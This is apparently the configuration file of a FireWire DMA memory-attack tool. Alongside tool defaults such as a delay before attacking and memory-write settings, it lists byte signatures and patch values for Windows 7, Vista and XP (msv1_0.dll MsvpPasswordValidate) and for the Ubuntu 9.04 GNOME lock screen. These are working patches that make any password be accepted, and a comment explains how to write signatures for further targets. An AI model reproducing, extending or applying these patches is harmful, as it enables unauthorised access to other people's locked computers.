'''
Created on Sep 6, 2011

@author: carsten
'''
#===============================================================================
# Configuration file with signatures
#===============================================================================
configfile = 'config.json'

#===============================================================================
# Constants
#===============================================================================
KiB = 1024              # One KiloByte
MiB = 1024 * KiB        # One MegaByte
GiB = 1024 * MiB        # One GigaByte
PAGESIZE = 4 * KiB      # For the sake of this tool, this is always the case

    
#===============================================================================
# Global variables/defaults
#===============================================================================
verbose = False         # Not verbose
fw_delay = 15           # 15 seconds delay before attacking
filemode = False        # Search in file instead of FW DMA
dry_run = False         # No write-back into memory
target = False          # No target set
filename = ''           # No filename set per default
buflen = 15             # Buffer length for checking if we get data
memsize = 4 * GiB       # 4 GiB, FW max
success = True          # Optimistic-by-nature setting
encoding = None         # System encoding
vectorsize = 128        # Read vector size

#===============================================================================
# Targets are collected in a list of dicts using the following syntax:
# [{'OS': 'OS 1 name' # Used for matching and OS guessing
#  'versions': ['SP0', SP2],
#  'architecture': 'x86',
#  'name': 'Target 1 name', # Name
#  'signatures': [
#                 # 1st signature. Signatures are in an ordered list, and are
#                 # searched for in the sequence listed. If not 'keepsearching'
#                 # key is set, the tool will stop at the first match & patch.
#                 {'offsets': 0x00, # Relative to page boundary
#                  'chunks': [{'chunk': 0x00, # Signature to search for
#                              'internaloffset': 0x00, # Relative to offset
#                              'patch': 0xff, # Patch data
#                              'patchoffset': 0x00}]}, # Patch at an offset
#                 # 2nd signature. Demonstrates use of several offsets that
#                 # makes it easier to match signatures where the offset change
#                 # often. Also demonstrates split signatures; where the tool
#                 # matches that are split over several blobs of data. The
#                 # resulting patch below is '0x04__05' where no matching is
#                 # done for the data represented by '__'.
#                 {'offsets': [0x01, 0x02], # Signatures can have several offs
#                  'chunks': [{'chunk': 0x04, # 1st part of signature
#                              'internaloffset': 0x00,
#                              'patch': 0xff, # Patch data for the 1st part
#                              'patchoffset': 0x03}, # Patch at an offset
#                             {'chunk': 0x05, # 2nd part of signature
#                              'internaloffset': 0x02, # Offset relative to sig
#                              'patch': 0xff}]}]}] # Patch data for the 2nd part
#
# Key 'patchoffset' is optional and will be treated like 'None' if not 
# provided.
#
# OS key should follow the rudimentary format 'Name Version SP Architecture'
#
# Example signature with graphical explanation:
#
# 'signatures': [{'offsets': 0x01,
#                          'chunks': [{'chunk': 0xc60f85,
#                                      'internaloffset': 0x00},
#                                     {'chunk': 0x0000b8,
#                                      'internaloffset': 0x05,
#                                      'patch': 0xb001,
#                                      'patchoffset': 0x0a}]}]},
# 
#
#                |-patchoffset--------------->[  ] (patch here)
# 00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f  (byte offset)
# -----------------------------------------------
# c6 0f 85 a0 b8 00 00 b8 ab 05 03 ff ef 01 00 00
# \______/ \___/ \______/
#     \      \       \
#      \      \       |-- Chunk 2 at internaloffset 0x05
#       \      |-- Some data (ignore, don't match this)
#        |-- Chunk 1 at internaloffset 0x00
# \_____________________/
#            \
#             |-- Entire signature
#
#===============================================================================

targets=[{'OS': 'Windows 7',
          'versions': ['SP0', 'SP1'],
          'architecture': 'x64',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': [0x2a8, 0x2a1, 0x291],
                          'chunks': [{'chunk': 0xc60f85a0b80000b8,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001,
                                      'patchoffset': 0xbd}]}]},
         {'OS': 'Windows Vista',
          'versions': ['SP0'],
          'architecture': 'x86',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': [0x76a, 0x80F],
                          'chunks': [{'chunk': 0x8bff558bec81ec88000000a1a4,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001,
                                      'patchoffset': 0xbd}]}]},
         {'OS': 'Windows XP',
          'versions': ['SP2', 'SP3'],
          'architecture': 'x32',
          'name': 'msv1_0.dll MsvpPasswordValidate technique',
          'signatures': [{'offsets': [0x8aa, 0x862, 0x946],
                          'chunks': [{'chunk': 0x83f8107511b0018b,
                                      'internaloffset': 0x00,
                                      'patch': 0x83f8109090b0018b}]},
                         {'offsets': 0x927,
                          'chunks': [{'chunk': 0x8bff558bec83ec50a1,
                                      'internaloffset': 0x00,
                                      'patch': 0xb001,
                                      'patchoffset': 0xa5}]}]},
         {'OS': 'Ubuntu',
          'versions': ['9.04'],
          'architecture': 'x32',
          'name': 'Gnome lockscreen unlock',
          'signatures': [{'offsets': 0xd3f,
                          'chunks': [{'chunk': 0xe8cc61000085c00f85e4000000c74424100e460508c744240c14460508c744240827010000c74424042d,
                                      'internaloffset': 0x00,
                                      'patch': 0xb80100000085}]}]}]